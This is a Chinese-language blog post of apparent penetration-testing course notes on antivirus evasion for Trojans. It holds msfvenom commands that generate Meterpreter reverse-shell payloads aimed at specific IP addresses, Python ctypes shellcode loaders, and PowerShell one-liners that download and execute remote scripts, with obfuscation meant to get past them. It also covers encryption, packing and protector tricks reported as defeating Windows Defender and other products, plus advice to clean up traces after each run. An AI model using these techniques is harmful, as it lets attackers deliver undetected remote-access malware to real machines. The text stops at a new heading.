



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="X_T" href="http://www.n1h1l157.live/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="X_T" href="http://www.n1h1l157.live/atom.xml" />
<link rel="alternate" type="application/json" title="X_T" href="http://www.n1h1l157.live/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="渗透测试" />


<link rel="canonical" href="http://www.n1h1l157.live/2022/12/30/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/">



  <title>
XD22 10 免杀对抗 - 信息安全 |
Phut Hon = X_T = 天行健，君子以自强不息</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">XD22 10 免杀对抗
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2022-12-30 00:00:00">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2022-12-30T00:00:00+08:00">2022-12-30</time>
  </span>
  <span class="item" title="本文字数">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">本文字数</span>
    <span>20k</span>
    <span class="text">字</span>
  </span>
  <span class="item" title="阅读时长">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">阅读时长</span>
    <span>33 分钟</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Phut Hon</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/yxb6m3Ak4MhTNvU.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/JUZqV6zBpbmk97w.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/Atnrq5DWxYZj7wN.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/sAogJHmbkhVBX4D.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/PCwuTAfIR1Bnpkz.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/42PBV1A3YGWyXN8.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于 信息安全"><span itemprop="name">信息安全</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="http://www.n1h1l157.live/2022/12/30/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content=".N1h1l157">
    <meta itemprop="description" content="天行健，君子以自强不息, 人生如逆旅，我亦是行人">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="X_T">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h3 id="源码层面免杀"><a class="markdownIt-Anchor" href="#源码层面免杀">#</a> 源码层面免杀</h3>
<h4 id="c免杀"><a class="markdownIt-Anchor" href="#c免杀">#</a> c 免杀</h4>
<ul>
<li>木马生成</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cs/msf 木马</span></span><br><span class="line"><span class="meta prompt_">cs-&gt;</span><span class="language-bash">攻击-&gt;生成后门-&gt;payload生成windows可执行程序-&gt;选择监听器-&gt;生成</span></span><br><span class="line"><span class="meta prompt_">msf-&gt; </span><span class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp lhost=x.x.x lport=8079 -f c</span></span><br><span class="line"><span class="meta prompt_">msf-&gt; </span><span class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b <span class="string">&#x27;\x00&#x27;</span> lhost=47.102.120.55 lport=8079 -f raw &gt; shellcode.raw</span></span><br><span class="line">msf监听-&gt; use exploit/multi/handler</span><br></pre></td></tr></table></figure>
<ul>
<li>木马免杀</li>
</ul>
<p>用 windows 将 c 文件编译为 exe 文件运行，c 文件可操作空间更大，而不像 exe 程序，直接是程序，修改之后可能失去了木马作用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">xor加密:工具或自定义脚本</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">工具下载：https://github.com/Arno0x/ShellcodeWrapper</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用密钥“thisismykey ”对 shellcode 进行异或加密</span></span><br><span class="line">python2 shellcode_encoder.py -cpp -cs -py shellcode.raw thisismykey xor</span><br><span class="line">python xor.py -s shellcode.bin -d payload.c -n 10 -r out.bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">aes加密</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用密钥“thisismykey ”对 shellcode 进行aes加密</span></span><br><span class="line">python2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi aes</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成的cpp文件需要用gcc编译器进行编译成可执行文件</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hex加密</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">工具下载：https://github.com/ByPassAVTeam/ShellcodeLoader</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在线编码：https://gchq.github.io/CyberChef/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将 16 进制的payload生成exe可执行程序：</span></span><br><span class="line">LoaderMaker.exe download.dat xiaodi.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">rc4 加密:https://blog.csdn.net/weixin_45590789/article/details/105536623</span></span><br><span class="line">将shellcode经过rc4 加密，再进行利用</span><br></pre></td></tr></table></figure>
<ul>
<li>免杀结论</li>
</ul>
<p>经测试，只有 rc4 加密绕过了 windows Defender，而 360 没有被这几种方法绕过，自己写的 xor 加密，aes 加密，hex 加密，rc4 加密都很大程度上绕过了火 绒。每次木马执行完毕后，需要清理，防止指纹被采集，下次就不是很好使用了。</p>
<h4 id="py免杀"><a class="markdownIt-Anchor" href="#py免杀">#</a> py 免杀</h4>
<ul>
<li>py 执行木马的代码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行代码 1</span> </span><br><span class="line">shellcode = b&quot;xxxxx&quot;</span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(rwxpage,</span><br><span class="line">ctypes.create_string_buffer(shellcode), len(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -1)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行代码 2</span> </span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">ctypes.c_int(len(shellcode)),</span><br><span class="line">ctypes.c_int(0x3000),</span><br><span class="line">ctypes.c_int(0x40))</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">buf,</span><br><span class="line">ctypes.c_int(len(shellcode)))</span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span><br><span class="line">ctypes.c_int(0),</span><br><span class="line">ctypes.c_int(ptr),</span><br><span class="line">ctypes.c_int(0),</span><br><span class="line">ctypes.c_int(0),</span><br><span class="line">ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
<ul>
<li>混淆加密免杀</li>
</ul>
<p>（ 1 ）正常情况 直接执行<br>
（ 2 ）base 64 先编码，在进行解码操作，后者为新木马<br>
（ 3 ）aes+base64:msf 生成 base 64 编码木马，对木马 aes 加密，而后将 aes 解密操作变成可执行<br>
（ 4 ）序列化与反序列化<br>
（ 5 ）另外的 Xor，Rc4 等加密算法都可以实现测试</p>
<ul>
<li>不同的打包器打包木马</li>
</ul>
<p>对上述 5 种方法产生的木马进行打包</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pyinstaller 使用</span></span><br><span class="line">pyinstaller -F test.py</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">py2exe 打包</span></span><br><span class="line">python setup.py py2exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Nuitka 使用</span></span><br><span class="line">nuitka --mingw64 --standalone --show-memory --show-progress --nofollow-imports --follow-import-to=utils,src --output-dir=out 108.py</span><br></pre></td></tr></table></figure>
<h4 id="ps1-免杀"><a class="markdownIt-Anchor" href="#ps1-免杀">#</a> ps1 免杀</h4>
<p>cs 可以生成 powershell 文件和 powershell command 两种。第一种是文件模式，上线代码在 ps 1 种，直接运行就可以上线，第二种是一个 txt，复制代码用 cmd 执行即可上线。</p>
<ul>
<li>手工混淆</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先base 64 编码再去执行解码后的代码</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">bb=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(<span class="variable">$x</span>))</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">powershell绕过执行策略执行ps1 脚本的方法</span></span><br><span class="line">powershell -ExecutionPolicy bypass -File hr.ps1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在编码后的代码中添加一些垃圾数据，进行replace替换为空，解码执行</span></span><br><span class="line">- -----xiaosedi------xiaosedi-----xiaosedi------------.replace(&#x27;xiaosedi&#x27;,&#x27;&#x27;)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在原型代码中添加一些垃圾数据，编码解码之后，进行replace替换为空，干扰检测。</span></span><br></pre></td></tr></table></figure>
<ul>
<li>分离代码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将恶意代码的base 64 藏在web上，通过http请求去拿数据，再通过解码执行</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">d= ((New-Object System.Net.Webclient).DownloadString(&#x27;http://x.x.x.x/<span class="number">1</span>.txt&#x27;))</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">x=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(<span class="variable">$d</span>))</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">也可以配合手工混淆，将原型或编码后的代码加上干扰数据后放至远程http上</span></span><br></pre></td></tr></table></figure>
<ul>
<li>项目混淆</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/danielbohannon/Invoke-Obfuscation</span><br><span class="line">加载模块：Import-Module ./Invoke-Obfuscation.psd1</span><br><span class="line">运行程序：Invoke-Obfuscation</span><br><span class="line">原型文件路径：set scriptpath C:\Users\ 86135 \Desktop\1.ps1</span><br><span class="line">部分代码编码：set scriptblock &#x27;xxxx&#x27;</span><br><span class="line">进入编码：encoding</span><br><span class="line">选择编码： 1 - 8</span><br><span class="line">输出文件：out C:\Users\ 86135 \Desktop\11.ps1</span><br></pre></td></tr></table></figure>
<ul>
<li>木马转字节流 特征修改</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到关键木马，利用脚本将木马的核心代码转化为字节流，注意字节流不能加引号</span></span><br><span class="line"><span class="meta prompt_">[Byte[]]$</span><span class="language-bash">x=[Byte[]](1,23,315,124,......,2512)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将shellcode中的全部的代码进行变量替换，使其与原型发生很大不同</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">即通过fuzz的思想，看修改哪部分代码是defender检测的进行修改</span></span><br></pre></td></tr></table></figure>
<h4 id="ps1-cmd-免杀"><a class="markdownIt-Anchor" href="#ps1-cmd-免杀">#</a> ps1 cmd 免杀</h4>
<ul>
<li>执行远程原型木马</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行远程原型木马</span></span><br><span class="line">powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x/x.ps1&#x27;))&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>替换变量</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">替换变量</span></span><br><span class="line">powershell &quot;$a=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;$b=&#x27;tp://47.94.236.117/x.ps1&#x27;&#x27;));&#x27;;IEX ($a+$b)&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制powershell执行程序</span> </span><br><span class="line">copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe bypass.exe</span><br><span class="line">.\bypass.exe &quot;$a=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;$b=&#x27;tp://47.94.236.117/x.ps1&#x27;&#x27;));&#x27;;IEX ($a+$b)&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>垃圾数据干扰</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">垃圾数据干扰</span></span><br><span class="line">powershell -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal - w Normal -w Normal -w Normal -w Normal -w Normal -w Normal ...... Nor mal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal set-alias -name key -value IEX; key(New-Object Net.WebClient).Downl oadString(&#x27;ht&#x27;+&#x27;tp://47.94.236.117/x.ps1&#x27;)</span><br></pre></td></tr></table></figure>
<ul>
<li>替换原型木马关键字进行干扰</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">替换原型木马关键字进行干扰</span></span><br><span class="line">powershell -NoExit &quot;$c1=&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;;$c2=&#x27;123(&#x27;&#x27;http://47.94.236.117/x.ps1&#x27;&#x27;)&#x27;.Replace(&#x27;123&#x27;,&#x27;adString&#x27;);IEX ($c1+$c2)&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>Ladon 混淆命令<br>
通过 ladon 将 powershell 免杀木马生成为 exe 可执行文件<br>
通过 ps2exe 生成 exe 文件：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL01TY2hvbHRlcy9XaW4tUFMyRVhF">https://github.com/MScholtes/Win-PS2EXE</span></li>
</ul>
<h4 id="c-免杀"><a class="markdownIt-Anchor" href="#c-免杀">#</a> C# 免杀</h4>
<ul>
<li>原型木马</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">原型木马</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=47.94.236.117 LPORT=6688 -e x86/shikata_ga_nai -i 15 -f csharp</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用运行shellcode的C<span class="comment">#脚本运行此代码，生成exe文件测试木马</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>混淆加密<br>
先用 msf 生成 64 位木马<br>
用加密脚本进行加密，通过 key 来混淆原型木马获得字节流数据<br>
再用解密脚本进行解密，用 key 与字节流数据运行脚本进行干扰杀毒检测<br>
而后打包为 exe 可执行文件测试木马</p>
</li>
<li>
<p>文件混淆<br>
一些杀毒软件会将木马放置到 VT 或者沙盒中运行，通过行为检测是否是 木马；而 exe 文件本身是支持反编译的，进行逆向可以找到源码中的 shellcode。 沙盒或许能识别到此 shellcode，通过一些软件实现加密原有 exe 程序，干扰杀 毒软件的判断能力。<br>
开源 - ConfuserEx 通过将原型木马加密<br>
付费 - VirboxProtector<br>
 看工具支持哪些语言，如果此工具不支持其他语言，加密后原功能会失效</p>
</li>
</ul>
<h4 id="go-免杀"><a class="markdownIt-Anchor" href="#go-免杀">#</a> Go 免杀</h4>
<ul>
<li>原型木马</li>
</ul>
<p>通过 cs 生成 c 代码，利用 go 脚本去运行 c 程序<br>
用运行 shellcode 的 go 脚本运行代码，直接运行或者生成 exe 文件测试木马</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行1.go脚本</span></span><br><span class="line">go run 1.go</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译1.go脚本</span></span><br><span class="line">go build 1.go</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">去弹窗编译1.go脚本</span></span><br><span class="line">go build -ldflags=&quot;-H windowsgui -w -s&quot; 1.go</span><br></pre></td></tr></table></figure>
<ul>
<li>分离代码</li>
</ul>
<p>如将 shellcode 进行 http 请求获取，或者以参数方式加入，又或者从资源中请求 shellcode<br>
 准备一个 AES 加密脚本，需要添加 shellcode 为要加密的内容，运行之后会随机生成 key，并利用此 key 将 shellcode 加密后的代码打印出来<br>
再准备一个 AES 解密脚本，需要输入参数 key 和要执行的代码，此脚本运行之后会利用 key 去解密还原 shellcode，将此 AES 解密脚本打包为 exe 文件</p>
<ul>
<li>分离代码 自定义代码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cs或msf生成raw格式</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.94.236.117 LPORT=6688 -f hex</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写go脚本直接从参数中获取shellcode运行，运行exe程序时设置参数为hex木马</span></span><br><span class="line">go build -ldflags &quot;-s -w -H=windowsgui&quot; 5.go</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
<ul>
<li>分离代码 资源分离</li>
</ul>
<p>go 代码中写明要从某个文件获取代码，可以只想 msf/cs 生成的 bin 文件生成 exe 文件之后，将 bin 文件放置代码中指向的目录中执行 exe 就会读取木马并执行</p>
<ul>
<li>保护混淆</li>
</ul>
<p>通过软件 SafengineShielden 进行保护 混淆 禁止 VT 调试 禁止虚拟机运行等特点</p>
<h4 id="asm-免杀"><a class="markdownIt-Anchor" href="#asm-免杀">#</a> ASM 免杀</h4>
<ul>
<li>内联 C 混编</li>
</ul>
<p>通过 c 与 asm 的混合代码来执行 shellcode. 实测情况下对防病毒软件都没有作用</p>
<ul>
<li>花指令</li>
</ul>
<p>通过相关工具生成 asm 即汇编语言指令，加入到原有的内联 C 代码上干扰需要知道入口地址，通过 ollydeg 工具进行调试，重新打包文件，实测无效。</p>
<ul>
<li>编译汇编代码</li>
</ul>
<p>来源：<span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS5idXRpYW4ubmV0L3NoYXJlLzE1MzY=">https://forum.butian.net/share/1536</span><br>
 通过火绒剑抓取运行恶意软件时的进程，查看是否有远程 ip 及端口</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现30.4.204对应IP地址：</span></span><br><span class="line">30h,2fh,2dh,30h,32h,2fh,2dh,33h,2dh,31h,2fh,33h,00h</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以推断出在asm马中</span></span><br><span class="line">30=1, 2f=0, 2d=., 32=3, 33=4, 31=2 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">构造ip若为47.94.236.117则马为</span> </span><br><span class="line">33h,36h,2dh,38h,33h,2dh,31h,32h,35h,2dh,30h,30h,36h,00h</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">端口：</span></span><br><span class="line">82=52h 88=28h</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译器：https://www.masm32.com/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译为obj文件：</span></span><br><span class="line">ml /c /coff /Cp test.asm</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成exe文件：</span></span><br><span class="line">link /subsystem:console /libpath:c:\masm32\lib test.obj</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在cs上选择http监听器监听端口即可免杀</span> </span><br></pre></td></tr></table></figure>
<h4 id="java-免杀"><a class="markdownIt-Anchor" href="#java-免杀">#</a> Java 免杀</h4>
<ul>
<li>JAR 包原型</li>
</ul>
<p>msfvenom -p java/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f jar -o msf.jar</p>
<ul>
<li>JAR 包源码特征修改免杀</li>
</ul>
<p>Jar 反编译导出 - jdgui<br>
 修改上线配置 - config<br>
 修改启动主类 - MANIFEST.MF<br>
 修改执行代码 - Main.java<br>
 打包 class-javac Main.java<br>
 编译 jar -jar cvfm xiaodi.jar META-INF/MANIFEST.MF .</p>
<ul>
<li>JAR 包打包 EXE 执行免杀</li>
</ul>
<p>安装：exe4j Inno 进行打包<br>
 exe4j - 下载链接：<span class="exturl" data-url="aHR0cHM6Ly9leGU0ai5hcHBvbmljLmNvbS8=">https://exe4j.apponic.com/</span><br>
inno - 下载链接：<span class="exturl" data-url="aHR0cHM6Ly9qcnNvZnR3YXJlLm9yZy9pc2RsLnBocA==">https://jrsoftware.org/isdl.php</span><br>
 操作说明：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS8yMzYwMDAuaHRt">https://www.jb51.net/article/236000.htm</span></p>
<h3 id="py-无文件落地"><a class="markdownIt-Anchor" href="#py-无文件落地">#</a> py 无文件落地</h3>
